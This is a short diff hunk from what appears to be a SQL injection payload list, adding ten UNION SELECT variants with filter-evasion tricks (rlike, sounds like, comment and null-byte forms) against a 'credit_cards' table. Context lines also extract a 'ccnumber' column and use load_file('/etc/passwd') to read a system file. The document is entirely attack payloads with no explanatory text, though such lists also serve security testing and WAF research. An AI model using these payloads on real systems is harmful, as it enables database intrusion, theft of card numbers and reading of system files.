@@ -91,4 +91,13 @@ TRUE DIV(SELECT ((ORD(LEFT
 1001 sounds like '1001' union select 1,ccnumber,3,4 from credit_cards
 1001-'text' union select 1,ccnumber,3,4 from credit_cards
 1001%2b@a union select 1,load_file('/etc/passwd'),3,4 from credit_cards
-
+((1001)-1) union select 1,2,3,4 from credit_cards
+1001'-@a union select 1,2,3,4 from credit_cards-- -
+'1001'-@a union select 1,2,3,4 from credit_cards
+((1001)-1) union select 1,2,3,4 from credit_cards
+1001 rlike(-1)union select 1,2,3,4 from credit_cards
+1001 ----1 union select 1,2,3,4 from credit_cards
+1001 or 'foo' union select 1,2,3,4 from credit_cards
+1001 and @a union select 1,2,3,4 from credit_cards
+1001 like @a-1 union select 1,2,3,4 from credit_cards
+1001-\N-\N union select 1,2,3,4 from credit_cards
